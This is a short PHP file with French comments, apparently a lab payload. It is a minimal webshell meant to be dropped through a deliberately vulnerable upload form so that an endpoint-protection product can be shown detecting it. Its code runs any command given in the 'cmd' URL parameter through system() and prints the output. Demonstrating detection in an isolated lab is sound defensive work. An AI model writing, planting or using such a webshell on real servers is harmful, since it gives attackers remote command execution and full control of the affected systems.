<?php
// ============================================================
//  PAYLOAD DE DEMO - "webshell" minimal pour illustrer l'impact
//  de la faille d'upload non filtre (voir upload.php).
//
//  Usage demo :
//   1. Deposer ce fichier via le formulaire d'upload (index.php)
//   2. Ouvrir http://<host>/uploads/shell.php?cmd=whoami
//   3. Observer la detection / le blocage par CrowdStrike Falcon
//      (creation de process enfant par php-cgi.exe / w3wp.exe,
//       ecriture de fichier .php suspect, etc.)
//
//  NE JAMAIS deployer ce fichier en dehors d'un environnement de
//  demo/lab isole.
// ============================================================

if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo "Usage : ?cmd=whoami";
}
